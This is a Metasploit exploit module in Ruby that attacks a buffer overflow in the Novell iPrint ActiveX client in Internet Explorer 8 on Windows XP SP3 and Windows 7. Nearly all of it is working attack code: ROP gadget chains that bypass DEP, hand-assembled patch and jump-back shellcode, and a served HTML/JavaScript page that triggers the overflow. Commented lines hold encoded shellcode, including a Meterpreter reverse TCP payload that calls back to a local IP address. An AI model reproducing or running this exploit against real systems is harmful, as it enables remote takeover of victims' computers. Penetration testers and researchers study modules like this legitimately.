require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})

		super(update_info(info,

           'Name'           => 'Buffer Overflow against the Novell iPrint Client on IE8',
           'Description'    => %q{
                   This module exploits the Novell iPrint client with 
                   a buffer overflow exploit on IE8.
           },
           'License'        => MSF_LICENSE,
           'Author'         => [ 'manu.carus@ethical-hacking.de' ],
           'Version'        => '$Revision: $',
           'DefaultOptions' =>
               {
                   'EXITFUNC' => 'process',
               },
           'Payload'        =>
               {
                   # 'Space'       => 683,  # 449 + 8 + 256 (buffer) - 30 (patch code)
                   # 'DisableNops' => true,
                   'BadChars'    => "\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f",
               },
           'Platform'       => 'win',
           'Targets'        =>
               [
                   [ 'IE 8 XPSP3',                   
                      { 
                        # rop chain generated with mona.py - www.corelan.be
                        # Register setup for VirtualProtect() :
                        # --------------------------------------------
                        #  EAX = tr to &VirtualProtect()
                        #  ECX = lpOldProtect (ptr to W address)
                        #  EDX = NewProtect (0x40)
                        #  EBX = dwSize
                        #  ESP = lPAddress (automatic)
                        #  EBP = POP (skip 4 bytes)
                        #  ESI = ptr to JMP [EAX]
                        #  EDI = ROP NOP (RETN)
                        #  + place ptr to "jmp esp" on stack, below PUSHAD
                        # --------------------------------------------
        
                        'rop_gadgets' =>
                        [
                           0x5c0bcf4f,  # POP EBP # RETN           [NIPPLIB.DLL] 
                           0x5c0bcf4f,  # skip 4 bytes             [NIPPLIB.DLL]
                           0x5c0529f8,  # POP EAX # RETN           [NIPPLIB.DLL] 
                           0xfffffdff,  # negate to 0x00000201
                           0x5c080337,  # NEG EAX # RETN           [NIPPLIB.DLL] 
                           0x5c08d949,  # XCHG EAX,EBX # RETN      [NIPPLIB.DLL] 
                           0x5c06dc78,  # POP EAX # RETN           [NIPPLIB.DLL] 
                           0xffffffc0,  # negate to 0x00000040
                           0x5c09cfd3,  # NEG EAX # RETN           [NIPPLIB.DLL] 
                           0x5c06a72a,  # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
                           0x5c0b6cfd,  # POP ECX # RETN           [NIPPLIB.DLL] 
                           0x5c128f4e,  # &Writable location       [NIPPLIB.DLL]
                           0x5c09c8ce,  # POP EDI # RETN           [NIPPLIB.DLL] 
                           0x5c075142,  # RETN (ROP NOP)           [NIPPLIB.DLL]
                           0x5c0766bf,  # POP ESI # RETN           [NIPPLIB.DLL] 
                           0x5c01bbc0,  # JMP [EAX]                [NIPPLIB.DLL]
                           0x5c06dc78,  # POP EAX # RETN           [NIPPLIB.DLL] 
                           0x7e72121c,  # ptr to &VirtualProtect() [IAT SXS.DLL]
                           0x5c0839ac,  # PUSHAD # RETN            [NIPPLIB.DLL] 
                           0x5c09beeb,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
                        ].pack("V*"),
                         
                        'Ret'  => 0x5c075142, # RETN               [NIPPLIB.DLL]
                             
                        'offset_to_corruption' =>  449,         
                        'offset_to_eip'        =>  717,
                        'offset_to_esp'        =>  737,
                        'buffer_length'        => 1000,
                        
                        'patch_code' => "81c190feffff"  +  # add ecx,-170h
                                        "c701XXXXXXXX"  +  # mov dword ptr [ecx], dword1
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "c701YYYYYYYY",    # mov dword ptr [ecx], dword2
                        
                        'jmp_back'             => "684e8f125c"   +   # push 0x5c128f4e 
                                                  "b8c0ffffff"   +   # mov  eax, 0xffffffc0
                                                  "f7d8"         +   # neg  eax
                                                  "50"           +   # push eax             
                                                  "b8fffdffff"   +   # mov  eax, 0xfffffdff
                                                  "f7d8"         +   # neg  eax
                                                  "50"           +   # push eax
                                                  "54"           +   # push esp
                                                  "58"           +   # pop eax
                                                  "05cffcffff"   +   # add  eax, -331h
                                                  "50"           +   # push eax
                                                  "b81c12727e"   +   # mov  eax, 0x7e72121c
                                                  "ff10"         +   # call [eax]
                                                  "54"           +   # push esp
                                                  "59"           +   # pop  ecx
                                                  "81c448f4ffff" +   # add esp,-3000
                                                  "e9a0fcffff",      # jmp $-35bh to shellcode
                      } 
                   ],
 
                   [ 'IE 8 Win7 (32bit)', 
                      { 
                        # rop chain generated with mona.py - www.corelan.be
                        # Register setup for VirtualAlloc() :
                        # --------------------------------------------
                        #  EAX = ptr to &VirtualAlloc()
                        #  ECX = flProtect (0x40)
                        #  EDX = flAllocationType (0x1000)
                        #  EBX = dwSize
                        #  ESP = lpAddress (automatic)
                        #  EBP = POP (skip 4 bytes)
                        #  ESI = ptr to JMP [EAX]
                        #  EDI = ROP NOP (RETN)
                        #  + place ptr to "jmp esp" on stack, below PUSHAD
                        # --------------------------------------------

                        'rop_gadgets' => 
                        [
                           0x1001b672, # POP EAX # RETN             [ienipp.ocx]
                           0xffffffff, # negate to 00000001
                           0x5c09cfd3, # NEG EAX # RETN             [NIPPLIB.DLL] 
                           0x5c08d949, # XCHG EAX,EBX # RETN        [NIPPLIB.DLL] 
                           0x100358e9, # POP EAX # RETN             [ienipp.ocx] 
                           0x7fffcffb, # delta to 00001000
                           0x10017001, # ADD EAX,80004005 # RETN 08 [ienipp.ocx] 
                           0x5c06a72a, # XCHG EAX,EDX # RETN 00     [NIPPLIB.DLL] 
                           0x41414141, # Filler (RETN offset)
                           0x41414141, # Filler (RETN offset)
                           0x10014e21, # POP EAX # RETN             [ienipp.ocx] 
                           0xffffffc0, # negate to 00000040
                           0x5c0abe26, # NEG EAX # RETN             [NIPPLIB.DLL] 
                           0x1003eab9, # XCHG EAX,ECX # POP EDI 
                                       # ADD EAX,8 # POP ESI 
                                       # POP EBP # RETN 04          [ienipp.ocx] 
                           0x41414141, # Filler (compensate)
                           0x41414141, # Filler (compensate)
                           0x41414141, # Filler (compensate)
                           0x5c075ffc, # POP EDI # RETN             [NIPPLIB.DLL] 
                           0x41414141, # Filler (RETN offset)
                           0x1001b673, # RETN (ROP NOP)             [NIPPLIB.DLL]
                           0x5c076774, # POP ESI # RETN             [NIPPLIB.DLL] 
                           0x5c01bbc0, # JMP [EAX]                  [NIPPLIB.DLL]
                           0x1004b13f, # POP EAX # RETN             [ienipp.ocx]
                           0x100521ff, # ptr to &kernel32!
                                       #         virtualallocstub   [ienipp.ocx] 
                           0x5c058f51, # INC EAX # RETN             [NIPPLIB.DLL]
                           0x5c0ae14f, # POP EBP # RETN             [NIPPLIB.DLL]
                           0x5c0ae14f, # skip 4 bytes               [NIPPLIB.DLL]
                           0x5c0839e1, # PUSHAD # RETN              [NIPPLIB.DLL] 
                           0x5c0635b2, # ptr to 'push esp # ret     [NIPPLIB.DLL]
                        ].pack("V*"),

                        'Ret'  => 0x5c075142, # RETN                [NIPPLIB.DLL]

                        'offset_to_corruption' =>  449,         
                        'offset_to_eip'        =>  717,
                        'offset_to_esp'        =>  737,
                        'buffer_length'        => 1000,
                        
                        'patch_code' => "81c1c4feffff"  +  # add ecx,-13Ch
                                        "c701XXXXXXXX"  +  # mov dword ptr [ecx], dword1
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "41"            +  # inc ecx
                                        "c701YYYYYYYY"  +  # mov dword ptr [ecx], dword2
                                        "81c448f4ffff",    # add esp,-3000

                        'jmp_back'             => "b8c0ffffff" +   # mov  eax, 0xffffffc0
                                                  "f7d8"       +   # neg  eax
                                                  "50"         +   # push eax
                                                  "b8ffefffff" +   # mov  eax, 0xffffefff
                                                  "f7d8"       +   # neg  eax
                                                  "48"         +   # dec  eax
                                                  "50"         +   # push eax
                                                  "53"         +   # push ebx
                                                  "54"         +   # push esp
                                                  "58"         +   # pop eax
                                                  "05b7fcffff" +   # add eax,-349h
                                                  "50"         +   # push eax
                                                  "50"         +   # push eax
                                                  "b8ff210510" +   # mov  eax, 0x100521ff
                                                  "40"         +   # inc eax
                                                  "ff20",          # jmp [eax]
                                   
                      } 
                   ]
               ],
           'DisclosureDate' => '',
           'DefaultTarget'  => 0))
	end

	def autofilter
	   false
	end

	def check_dependencies
	   use_zlib
	end
	
	def on_request_uri(cli, request)
	
 	   # Re-generate the payload.
	   # return if ((p = regenerate_payload(cli)) == nil)

           # Encode the payload
           encoded_payload = payload.encoded
           
           # msfpayload windows/exec cmd=calc R | msfencode -e x86/alpha_mixed -b '\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f' -t c
           # encoded_payload  = "\x54\x59\xd9\xcf\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
           # encoded_payload += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
           # encoded_payload += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
           # encoded_payload += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
           # encoded_payload += "\x49\x6c\x68\x68\x4b\x32\x63\x30\x57\x70\x33\x30\x53\x50\x4c"
           # encoded_payload += "\x49\x59\x75\x46\x51\x39\x50\x50\x64\x6c\x4b\x46\x30\x64\x70"
           # encoded_payload += "\x4e\x6b\x31\x42\x54\x4c\x6e\x6b\x63\x62\x56\x74\x4c\x4b\x52"
           # encoded_payload += "\x52\x51\x38\x56\x6f\x4d\x67\x62\x6a\x35\x76\x30\x31\x59\x6f"
           # encoded_payload += "\x6c\x6c\x35\x6c\x31\x71\x43\x4c\x73\x32\x74\x6c\x67\x50\x6f"
           # encoded_payload += "\x31\x7a\x6f\x76\x6d\x67\x71\x58\x47\x6d\x32\x38\x72\x51\x42"
           # encoded_payload += "\x53\x67\x4e\x6b\x42\x72\x44\x50\x4c\x4b\x73\x7a\x67\x4c\x4e"
           # encoded_payload += "\x6b\x52\x6c\x74\x51\x64\x38\x4d\x33\x32\x68\x45\x51\x68\x51"
           # encoded_payload += "\x46\x31\x6c\x4b\x43\x69\x47\x50\x33\x31\x48\x53\x4c\x4b\x43"
           # encoded_payload += "\x79\x46\x78\x39\x73\x37\x4a\x72\x69\x4e\x6b\x50\x34\x6e\x6b"
           # encoded_payload += "\x67\x71\x39\x46\x44\x71\x79\x6f\x6c\x6c\x4a\x61\x48\x4f\x44"
           # encoded_payload += "\x4d\x75\x51\x6f\x37\x66\x58\x59\x70\x43\x45\x4a\x56\x75\x53"
           # encoded_payload += "\x33\x4d\x39\x68\x67\x4b\x31\x6d\x71\x34\x34\x35\x49\x74\x36"
           # encoded_payload += "\x38\x6c\x4b\x56\x38\x74\x64\x45\x51\x6a\x73\x61\x76\x6c\x4b"
           # encoded_payload += "\x64\x4c\x32\x6b\x4e\x6b\x50\x58\x45\x4c\x46\x61\x58\x53\x6e"
           # encoded_payload += "\x6b\x43\x34\x4e\x6b\x73\x31\x4e\x30\x6f\x79\x47\x34\x57\x54"
           # encoded_payload += "\x61\x34\x53\x6b\x31\x4b\x35\x31\x33\x69\x50\x5a\x43\x61\x69"
           # encoded_payload += "\x6f\x59\x70\x53\x6f\x63\x6f\x61\x4a\x6c\x4b\x72\x32\x6a\x4b"
           # encoded_payload += "\x6c\x4d\x63\x6d\x51\x7a\x56\x61\x4c\x4d\x4c\x45\x4e\x52\x73"
           # encoded_payload += "\x30\x43\x30\x53\x30\x46\x30\x53\x58\x34\x71\x6e\x6b\x50\x6f"
           # encoded_payload += "\x4d\x57\x39\x6f\x6b\x65\x4d\x6b\x48\x70\x6d\x65\x49\x32\x53"
           # encoded_payload += "\x66\x32\x48\x6f\x56\x6e\x75\x4d\x6d\x4d\x4d\x4b\x4f\x4e\x35"
           # encoded_payload += "\x65\x6c\x37\x76\x51\x6c\x74\x4a\x6d\x50\x69\x6b\x69\x70\x51"
           # encoded_payload += "\x65\x77\x75\x4f\x4b\x53\x77\x47\x63\x33\x42\x72\x4f\x73\x5a"
           # encoded_payload += "\x45\x50\x61\x43\x6b\x4f\x5a\x75\x62\x43\x50\x61\x30\x6c\x72"
           # encoded_payload += "\x43\x33\x30\x41\x41"
                      
           # msfpayload windows/meterpreter/reverse_tcp lhost=192.168.2.108 lport=4444 R | msfencode -e x86/alpha_mixed -b '\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f' -t c
           # [*] x86/alpha_mixed succeeded with size 440 (iteration=1)
           # encoded_payload  = "\x54\x5e\xda\xd8\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
           # encoded_payload += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
           # encoded_payload += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
           # encoded_payload += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
           # encoded_payload += "\x69\x6c\x5a\x48\x4e\x62\x73\x30\x57\x70\x47\x70\x51\x70\x6c"
           # encoded_payload += "\x49\x69\x75\x46\x51\x79\x50\x30\x64\x4e\x6b\x72\x70\x44\x70"
           # encoded_payload += "\x6e\x6b\x63\x62\x54\x4c\x4e\x6b\x30\x52\x57\x64\x4c\x4b\x62"
           # encoded_payload += "\x52\x57\x58\x56\x6f\x6e\x57\x63\x7a\x64\x66\x56\x51\x6b\x4f"
           # encoded_payload += "\x4e\x4c\x65\x6c\x35\x31\x53\x4c\x34\x42\x36\x4c\x57\x50\x6b"
           # encoded_payload += "\x71\x7a\x6f\x46\x6d\x43\x31\x39\x57\x78\x62\x4c\x32\x36\x32"
           # encoded_payload += "\x62\x77\x4c\x4b\x52\x72\x76\x70\x4e\x6b\x63\x7a\x35\x6c\x6e"
           # encoded_payload += "\x6b\x42\x6c\x34\x51\x53\x48\x68\x63\x51\x58\x45\x51\x68\x51"
           # encoded_payload += "\x42\x71\x4c\x4b\x33\x69\x67\x50\x56\x61\x49\x43\x6c\x4b\x42"
           # encoded_payload += "\x69\x32\x38\x78\x63\x54\x7a\x67\x39\x6e\x6b\x30\x34\x4e\x6b"
           # encoded_payload += "\x65\x51\x78\x56\x54\x71\x4b\x4f\x6e\x4c\x4b\x71\x48\x4f\x54"
           # encoded_payload += "\x4d\x67\x71\x38\x47\x45\x68\x4d\x30\x72\x55\x4b\x46\x56\x63"
           # encoded_payload += "\x51\x6d\x79\x68\x47\x4b\x31\x6d\x34\x64\x51\x65\x5a\x44\x73"
           # encoded_payload += "\x68\x6e\x6b\x73\x68\x65\x74\x57\x71\x5a\x73\x55\x36\x4c\x4b"
           # encoded_payload += "\x56\x6c\x70\x4b\x4e\x6b\x36\x38\x55\x4c\x36\x61\x4a\x73\x6e"
           # encoded_payload += "\x6b\x55\x54\x4e\x6b\x47\x71\x78\x50\x4f\x79\x72\x64\x51\x34"
           # encoded_payload += "\x54\x64\x51\x4b\x53\x6b\x55\x31\x53\x69\x43\x6a\x73\x61\x59"
           # encoded_payload += "\x6f\x4b\x50\x33\x6f\x51\x4f\x63\x6a\x4e\x6b\x64\x52\x5a\x4b"
           # encoded_payload += "\x6e\x6d\x31\x4d\x45\x38\x50\x33\x70\x32\x65\x50\x43\x30\x73"
           # encoded_payload += "\x58\x54\x37\x72\x53\x67\x42\x63\x6f\x52\x74\x71\x78\x50\x4c"
           # encoded_payload += "\x72\x57\x31\x36\x76\x67\x69\x6f\x78\x55\x4e\x58\x7a\x30\x76"
           # encoded_payload += "\x61\x73\x30\x67\x70\x51\x39\x4a\x64\x73\x64\x62\x70\x35\x38"
           # encoded_payload += "\x51\x39\x6f\x70\x52\x4b\x63\x30\x69\x6f\x6a\x75\x46\x30\x52"
           # encoded_payload += "\x70\x46\x30\x76\x30\x67\x30\x52\x70\x37\x30\x72\x70\x31\x78"
           # encoded_payload += "\x78\x6a\x54\x4f\x69\x4f\x69\x70\x4b\x4f\x6b\x65\x4c\x57\x61"
           # encoded_payload += "\x7a\x64\x45\x72\x48\x4b\x70\x6d\x78\x33\x32\x52\x4c\x50\x68"
           # encoded_payload += "\x46\x62\x43\x30\x77\x61\x33\x6c\x6c\x49\x59\x76\x71\x7a\x42"
           # encoded_payload += "\x30\x43\x66\x61\x47\x72\x48\x4f\x69\x6e\x45\x70\x74\x55\x31"
           # encoded_payload += "\x49\x6f\x38\x55\x6c\x45\x6b\x70\x64\x34\x54\x4c\x49\x6f\x72"
           # encoded_payload += "\x6e\x45\x58\x62\x55\x5a\x4c\x30\x68\x4c\x30\x6c\x75\x4f\x52"
           # encoded_payload += "\x32\x76\x69\x6f\x7a\x75\x61\x7a\x67\x70\x43\x5a\x64\x44\x53"
           # encoded_payload += "\x66\x62\x77\x51\x78\x44\x42\x68\x59\x5a\x68\x51\x4f\x79\x6f"
           # encoded_payload += "\x38\x55\x4e\x6b\x34\x76\x30\x6a\x47\x30\x51\x78\x45\x50\x62"
           # encoded_payload += "\x30\x47\x70\x75\x50\x61\x46\x73\x5a\x77\x70\x62\x48\x46\x38"
           # encoded_payload += "\x79\x34\x70\x53\x39\x75\x59\x6f\x58\x55\x6d\x43\x43\x63\x71"
           # encoded_payload += "\x7a\x57\x70\x52\x76\x61\x43\x63\x67\x72\x48\x67\x72\x69\x49"
           # encoded_payload += "\x69\x58\x31\x4f\x4b\x4f\x38\x55\x63\x31\x7a\x63\x51\x39\x78"
           # encoded_payload += "\x46\x63\x45\x7a\x4e\x78\x43\x41\x41"
                      
 	   # Encode the rop chain 
	   rop = target['rop_gadgets'].unpack("H*").join();

	   # Encode eip overwrite
	   eip  = "%08x" % target.ret

           # buffer size
           offset_to_corruption = target['offset_to_corruption']
           offset_to_eip        = target['offset_to_eip']
           offset_to_esp        = target['offset_to_esp']
           buffer_length        = target['buffer_length']
                        		
	   # Junk
	   # junk1 = "X" * target['buffer_length']
	   # junk2 = "Y" * target['buffer_length']
	   # junk3 = "Z" * target['buffer_length']
	   	   
	   junk1 = Rex::Text.rand_text_alpha(target['buffer_length'])
	   junk2 = Rex::Text.rand_text_alpha(target['buffer_length'])
   	   junk3 = Rex::Text.rand_text_alpha(target['buffer_length'])

           print_status(("encoded_payload length: %d") % encoded_payload.length)
	   print_status("encoded_payload: \r\n" + Rex::Text.to_hex_dump(encoded_payload))

           # patch corrupted payload
           patch_code = ""
           patch_code += "90"           # nop
           patch_code += "90"           # nop
           
           if (encoded_payload.length > offset_to_corruption)

             print_status("Patching payload bytes!")

             # patch code: first get length, then replace dummy dwords by patch bytes
             patch_code += target['patch_code']
             
             patch_code_length = patch_code.length / 2 # hex digits
             
             print_status("patch_code_length: %d bytes." % patch_code_length)

             byte_offset_1c1 = encoded_payload[0x1C1-patch_code_length]
             byte_offset_1c2 = encoded_payload[0x1C2-patch_code_length]
             byte_offset_1c3 = encoded_payload[0x1C3-patch_code_length]
             byte_offset_1c4 = encoded_payload[0x1C4-patch_code_length]
             byte_offset_1c5 = encoded_payload[0x1C5-patch_code_length]
             byte_offset_1c6 = encoded_payload[0x1C6-patch_code_length]
             byte_offset_1c7 = encoded_payload[0x1C7-patch_code_length]
             byte_offset_1c8 = encoded_payload[0x1C8-patch_code_length]
             
             print_status("offset 1C1: " + byte_offset_1c1 + " (%02x)" % byte_offset_1c1.ord)
             print_status("offset 1C2: " + byte_offset_1c2 + " (%02x)" % byte_offset_1c2.ord)
             print_status("offset 1C3: " + byte_offset_1c3 + " (%02x)" % byte_offset_1c3.ord)
             print_status("offset 1C4: " + byte_offset_1c4 + " (%02x)" % byte_offset_1c4.ord)
             print_status("offset 1C5: " + byte_offset_1c5 + " (%02x)" % byte_offset_1c5.ord)
             print_status("offset 1C6: " + byte_offset_1c6 + " (%02x)" % byte_offset_1c6.ord)
             print_status("offset 1C7: " + byte_offset_1c7 + " (%02x)" % byte_offset_1c7.ord)
             print_status("offset 1C8: " + byte_offset_1c8 + " (%02x)" % byte_offset_1c8.ord)
              
             dword1  = "%02x" % byte_offset_1c1.ord
             dword1 += "%02x" % byte_offset_1c2.ord
             dword1 += "%02x" % byte_offset_1c3.ord
             dword1 += "%02x" % byte_offset_1c4.ord
             
             dword2  = "%02x" % byte_offset_1c5.ord
             dword2 += "%02x" % byte_offset_1c6.ord
             dword2 += "%02x" % byte_offset_1c7.ord
             dword2 += "%02x" % byte_offset_1c8.ord

             patch_code["XXXXXXXX"] = dword1  # mov dword ptr [ecx], dword1
             patch_code["YYYYYYYY"] = dword2  # mov dword ptr [ecx], dword2
             
             print_status("patch code: " + patch_code)

           end
           
 	   jmp_back = target['jmp_back']

	   js = <<-JS

		function addressToString(address_string)
		{
		   if (address_string.length % 8) 
		   {
		      alert("Invalid address!");
		      return;
		   }
		   
		   addresses = '';
		   
		   for (i=0; i < address_string.length; i+=8)
		   {
		      address = address_string.substring(i, i+8);

   		      hex_byte1 = address.substring(0, 2);
		      hex_byte2 = address.substring(2, 4);
		      hex_byte3 = address.substring(4, 6);
		      hex_byte4 = address.substring(6);

 		      addresses += "%" + hex_byte4 + "%" + hex_byte3 + "%" + hex_byte2 + "%" + hex_byte1;
		   } 
   
		   return unescape(addresses);
		}

		function opcodesToString(opcodes_string)
		{
		   if (opcodes_string.length % 2 != 0) 
		   {
		      alert("Invalid opcodes!");
		      return;
		   }
   
		   opcodes = '';
		   for (i=0; i < opcodes_string.length; i+=2)
		   {
		      opcodes += "%" + opcodes_string.substring(i, i+2);
		   }
   
		   return unescape(opcodes);
		}
		
		shellcode = "";
		
		if ("#{patch_code}".length > 0)
		{
		   shellcode += opcodesToString("#{patch_code}");
		}

		shellcode += "#{encoded_payload}"; // this is already alpha-encoded!
		
		jmp_back = opcodesToString("#{jmp_back}");
           
                eip = addressToString("#{eip}");  // set EIP to RETN
                
                rop_chain = opcodesToString("#{rop}"); // contains addresses but in correct byte order

                junk1 = '#{junk1}'.substring(0, #{offset_to_eip} - shellcode.length);
                junk2 = '#{junk2}'.substring(0, #{offset_to_esp} - #{offset_to_eip} - 4);
                junk3 = '#{junk3}'.substring(0, #{buffer_length} - shellcode.length - junk1.length - 4 - junk2.length - '#{rop}'.length - jmp_back.length);

                // trigger the overflow
		ret = '';
		ret += shellcode + junk1 + eip + junk2 + rop_chain + jmp_back + junk3;
		
                arg1 = 'printer';
                arg2 = 'realm';
                arg3 = 'user';
                arg4 = 'pass';

/*
                alert("shellcode: " + shellcode.length + " bytes");
                alert("junk1: " + junk1.length + " bytes");
                alert("eip: " + eip.length + " bytes");
                alert("junk2: " + junk2.length + " bytes");
                alert("rop_chain: " + rop_chain.length + " bytes");
                alert("jmp_back: " + jmp_back.length + " bytes");
                alert("junk3: " + junk3.length + " bytes");
                alert("ret: " + ret.length + " bytes");
*/
                
                document.write("Triggering the crash...");

                alert('Now set breakpoint to 0x#{eip}!');
                target.GetDriverSettings(ret,arg2,arg3,arg4);

                // var myTrigger = setInterval(function() {trigger()}, 200);
                // function trigger()
                // {
                   // target.GetDriverSettings(ret,arg2,arg3,arg4);
                   // clearInterval(myTrigger);
                // }

	   JS

	   # build html

	   content = <<-HTML
	   <html>
	      <object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' 
                      id='target'>
              </object>
		<script language='javascript'>
		   #{js}
		</script>
           </html>
	   HTML

	   print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

	   # Transmit the response to the client
	   send_response_html(cli, content)

	   # Handle the payload
	   #handler(cli)
	   
	end

end
